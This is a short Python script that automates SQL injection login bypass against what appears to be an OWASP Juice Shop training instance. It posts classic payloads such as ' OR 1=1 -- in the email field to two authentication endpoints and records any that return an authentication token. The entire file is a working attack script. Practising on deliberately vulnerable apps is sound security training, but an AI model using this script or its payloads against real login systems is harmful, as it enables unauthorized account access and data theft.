import requests

url = 'https://juice-shop.herokuapp.com'
possible_payloads = ["' OR 1=1 --", "' OR '1'='1", "example@examplo.com' --"]
endpoints = ['rest/user/login', 'rest/user/authentication-details']
valid_tries = []

def test_payload_on_endpoint(ep, payload):
    full_url = f"{url}/{ep}"
    with requests.Session() as session:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Content-Type': 'application/json'
        }
        data = {"email": payload, "password": "passwd"}
        try:
            response = session.post(full_url, json=data, headers=headers)
            response_data = response.json()
            server_response_time = response.elapsed.total_seconds()
            print(f"Trying payload ({payload}) on {full_url} -> Status Code: {response.status_code}, Server Response Time: {server_response_time}s")
            if response.status_code == 200 and 'authentication' in response_data:
                print(f"[+] SQL Injection successful on endpoint {full_url} with payload: {payload}")
                valid_tries.append({"url": full_url, "request_fields": {"email": payload, "password": "passwd"}})
                return True
        except (requests.exceptions.RequestException, ValueError):
            print(f"[-] Request failed for endpoint {full_url} with payload: {payload}")
            return False
    return False

for ep in endpoints:
    for payload in possible_payloads:
        if test_payload_on_endpoint(ep, payload):
            break

if valid_tries:
    print("SQL Injection attempts:")
    for attempt in valid_tries:
        print(attempt)
else:
    print("[-] SQL Injection unsuccessful")
